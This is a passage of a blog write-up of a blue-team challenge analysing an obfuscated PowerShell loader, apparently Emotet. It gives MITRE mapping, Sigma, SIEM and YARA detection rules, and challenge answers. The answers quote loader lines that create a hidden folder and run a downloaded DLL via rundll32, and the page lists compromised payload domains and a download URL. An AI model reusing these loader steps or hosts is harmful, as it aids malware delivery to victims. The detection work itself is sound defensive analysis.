</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="behavioral-analysis">Behavioral Analysis</h4>
<p>The script performs the following actions:</p>
<ol>
<li>Creates a hidden working directory in the user’s home directory</li>
<li>Forces TLS 1.2 to ensure HTTPS downloads succeed</li>
<li>Attempts to download a malicious DLL from multiple compromised websites</li>
<li>Uses multiple fallback URLs to ensure delivery</li>
<li>Validates the downloaded file size to avoid executing junk data</li>
<li>Executes the DLL using <code>rundll32.exe</code></li>
<li>Terminates execution after the first successful payload delivery</li>
</ol>
<h4 id="malware-classification">Malware Classification</h4>
<p><strong>Type:</strong> PowerShell Malware Loader / Dropper<br>
<strong>Payload:</strong> DLL<br>
<strong>Execution Method:</strong> <code>rundll32.exe</code><br>
<strong>Persistence:</strong> External payload execution<br>
<strong>Technique:</strong> Living-off-the-Land (LOLbins)</p>
<h4 id="mitre-attck-mapping">MITRE ATT&amp;CK Mapping</h4>
<table>
<thead>
<tr>
<th>Technique</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>T1059.001</td>
<td>PowerShell</td>
</tr>
<tr>
<td>T1105</td>
<td>Ingress Tool Transfer</td>
</tr>
<tr>
<td>T1218.011</td>
<td>Rundll32</td>
</tr>
<tr>
<td>T1027</td>
<td>Obfuscated Files</td>
</tr>
</tbody>
</table>
<h3 id="sigma-detection-rule---powershell-encoded-dll-loader">Sigma Detection Rule - PowerShell Encoded DLL Loader</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">title</span>: <span style="color:#ae81ff">Emotet (Heodo) PowerShell EncodedCommand DLL Loader via Rundll32</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">id</span>: <span style="color:#ae81ff">7c3b8b41-1f8e-4e2a-9e7c-3f7b2d4e9d21</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">status</span>: <span style="color:#ae81ff">experimental</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">description</span>: &gt;<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  Detects Emotet (aka Heodo) infection chain where PowerShell uses
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  EncodedCommand to download a DLL payload and execute it via rundll32.exe.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  This behavior is commonly observed in malspam-delivered Emotet campaigns.</span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">author</span>: <span style="color:#ae81ff">IR Team</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">date</span>: <span style="color:#ae81ff">2026</span><span style="color:#ae81ff">/01/15</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">modified</span>: <span style="color:#ae81ff">2026</span><span style="color:#ae81ff">/01/15</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">references</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">https://attack.mitre.org/techniques/T1059/001/</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">https://attack.mitre.org/techniques/T1218/011/</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">https://attack.mitre.org/techniques/T1105/</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">https://bazaar.abuse.ch/sample/23be1cb22c94fe77cea5f8e7fef6710eeef5a23e7e7eb9b9dd53f56d1b954269/</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">https://www.capesandbox.com/analysis/110417/</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">tags</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">attack.execution</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">attack.t1059.001       </span> <span style="color:#75715e"># PowerShell</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">attack.t1105           </span> <span style="color:#75715e"># Ingress Tool Transfer</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">attack.t1218.011       </span> <span style="color:#75715e"># Rundll32</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">attack.t1027           </span> <span style="color:#75715e"># Obfuscated Files or Information</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">malware.emotet</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">malware.heodo</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">malware.loader</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">malspam</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">powershell</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">logsource</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">category</span>: <span style="color:#ae81ff">process_creation</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">product</span>: <span style="color:#ae81ff">windows</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">detection</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">powershell_encoded</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Image|endswith</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">powershell.exe</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">pwsh.exe</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">CommandLine|contains</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;-enc&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;-EncodedCommand&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">powershell_network_loader</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">CommandLine|contains</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;System.Net.WebClient&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;DownloadFile&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;Tls12&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">rundll32_dll_exec</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Image|endswith</span>: <span style="color:#ae81ff">rundll32.exe</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">CommandLine|contains</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;.dll&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;Control_RunDLL&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">user_writable_dll</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">CommandLine|contains</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;\\Users\\&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;\\AppData\\&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;\\Temp\\&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;\\Downloads\\&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">condition</span>: &gt;<span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    powershell_encoded and
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    powershell_network_loader and
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    rundll32_dll_exec and
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    user_writable_dll</span>    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">falsepositives</span>:
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">Rare administrative scripts using EncodedCommand and rundll32</span>
</span></span><span style="display:flex;"><span>  - <span style="color:#ae81ff">Red team simulations mimicking Emotet tradecraft</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">level</span>: <span style="color:#ae81ff">critical</span>
</span></span></code></pre></div><h4 id="optional--url-focused-companion-rule-ioc-based">Optional : URL focused companion rule (IOC based)</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">title</span>: <span style="color:#ae81ff">Suspicious DLL Download from Compromised Websites</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">status</span>: <span style="color:#ae81ff">experimental</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">logsource</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">category</span>: <span style="color:#ae81ff">process_creation</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">product</span>: <span style="color:#ae81ff">windows</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">detection</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">selection</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">CommandLine|contains</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;admintk.com&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;mikegeerinck.com&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;freelancerwebdesignerhyderabad.com&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;etdog.com&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;hintup.com.br&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;stmarouns.nsw.edu.au&#39;</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;mcdevelop.net&#39;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">condition</span>: <span style="color:#ae81ff">selection</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">level</span>: <span style="color:#ae81ff">critical</span>
</span></span></code></pre></div><h3 id="siem">Siem</h3>
<p>Splunk (SPL)</p>
<pre tabindex="0"><code class="language-spl" data-lang="spl">index=* 
(Image=&#34;*powershell.exe&#34; OR Image=&#34;*pwsh.exe&#34;)
(CommandLine=&#34;*-enc*&#34; OR CommandLine=&#34;*-EncodedCommand*&#34;)
</code></pre><p>Elastic (KQL)</p>
<pre tabindex="0"><code class="language-kql" data-lang="kql">process.name : (&#34;powershell.exe&#34;,&#34;pwsh.exe&#34;) and
process.command_line : (&#34;*-enc*&#34;,&#34;*-EncodedCommand*&#34;)
</code></pre><p>Microsoft Sentinel (KQL)</p>
<pre tabindex="0"><code class="language-kql" data-lang="kql">SecurityEvent
| where ProcessName in (&#34;powershell.exe&#34;,&#34;pwsh.exe&#34;)
| where CommandLine contains &#34;-enc&#34;
</code></pre><h3 id="yara-rule">Yara Rule</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">rule DLL_Payload_PowerShell_Loader_GothamLegend</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">meta</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">description = &#34;Detects DLL payload dropped by PowerShell EncodedCommand loader and executed via rundll32&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">author = &#34;IR Team&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">date = &#34;2026-01-15&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">malware_type = &#34;Loader / DLL-based malware&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">delivery_method = &#34;PowerShell EncodedCommand&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">execution_method = &#34;rundll32 Control_RunDLL&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">reference = &#34;GothamLegend IR Case&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">strings</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">/* Common DLL execution indicator */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$export1 = &#34;Control_RunDLL&#34; ascii wide</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">/* .NET WebClient often embedded or referenced */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$net1 = &#34;System.Net.WebClient&#34; ascii wide</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$net2 = &#34;DownloadFile&#34; ascii wide</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">/* TLS enforcement seen in loader chains */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$tls1 = &#34;Tls12&#34; ascii wide</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$tls2 = &#34;SecurityProtocol&#34; ascii wide</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">/* LOLBIN abuse indicators */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$lolbin1 = &#34;rundll32.exe&#34; ascii wide</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">/* Common PE/DLL indicators */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$mz = { 4D 5A }          // MZ header</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$pe = { 50 45 00 00 }    // PE header</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">condition</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">/* Must be a valid PE file */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$mz at 0 and</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">$pe and</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">/* DLL-specific behavior indicators */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">(</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">$export1 or</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">$lolbin1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">) and</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">/* Network / loader behavior */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">of ($net*) and</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">of ($tls*)</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="challenge-submission">Challenge Submission</h2>
<p>Q1. What security protocol is being used for the communication with a malicious domain? <em>(3 points)</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Net.ServicePointManager</span>]::SecurityProtocol = <span style="color:#e6db74">&#34;Tls12&#34;</span>
</span></span></code></pre></div><ul>
<li>TLS 1.2</li>
</ul>
<p>Q2. What directory does the obfuscated PowerShell create? (Starting from \HOME) <em>(4 points)</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$workDir = Join-Path $HOME <span style="color:#e6db74">&#34;Db_bh30\Yf5be5g&#34;</span>
</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">System.IO.Directory</span>]::CreateDirectory($workDir) | Out-Null
</span></span></code></pre></div><ul>
<li>\HOME\Db_bh30\Yf5be5g\</li>
</ul>
<p>Q3. What file is being downloaded (full name)? <em>(4 points)</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$dllPath = Join-Path $workDir <span style="color:#e6db74">&#34;A69S.dll&#34;</span>
</span></span></code></pre></div><ul>
<li>A69S.dll</li>
</ul>
<p>Q4. What is used to execute the downloaded file? <em>(3 points)</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>rundll32.exe $dllPath,Control_RunDLL
</span></span></code></pre></div><ul>
<li>rundll32</li>
</ul>
<p>Q5. What is the domain name of the URI ending in ‘/6F2gd/’ <em>(3 points)</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#e6db74">&#34;https://wm.mcdevelop.net/content/6F2gd/&#34;</span>
</span></span></code></pre></div><ul>
<li>wm.mcdevelop.net</li>
</ul>
<p>Q6. Based on the analysis of the obfuscated code, what is the name of the malware? <em>(3 points)</em></p>
<ul>
<li>Searching a little with the keywords like <code>\HOME\Db_bh30\Yf5be5g\</code> and <code>A69s.dll</code> we can find the malware name</li>
<li>Emotet
<img src="https://i.ibb.co/bMG2NqPP/Pasted-image-20260115165812.png" alt=""></li>
</ul>

                </div>
            </article>

            <hr />

            <div class="post-info">
                
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="http://localhost:1313/tags/btlo/">btlo</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/soc/">soc</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/http/">http</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/powershell/">powershell</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/malware/">malware</a></span>
        <span class="tag"><a href="http://localhost:1313/tags/web/">web</a></span>
        
    </p>

                
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/soc-writeups/">SOC Writeups</a></span>
        <span class="tag"><a href="http://localhost:1313/categories/security-operations/">Security Operations</a></span>
        
    </p>

            </div>
        </main>
    </div>


            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            
            <span><a href="http://localhost:1313/"></a></span>
            <span></span>
            
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by Hugo</span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.19d7885e5a4b0e5e2cd7238fc80b8b19888099cb78c032aedeb0b3b0010b8bb3dfb34849cf40a9e83f55f266aa32354528c10a24f2a42e6e8e21e813a26d9647.js" integrity="sha512-GdeIXlpLDl4s1yOPyAuLGYiAmct4wDKu3rCzsAELi7Pfs0hJz0Cp6D9V8maqMjVFKMEKJPKkLm6OIegTom2WRw=="></script>




    </body>
</html>
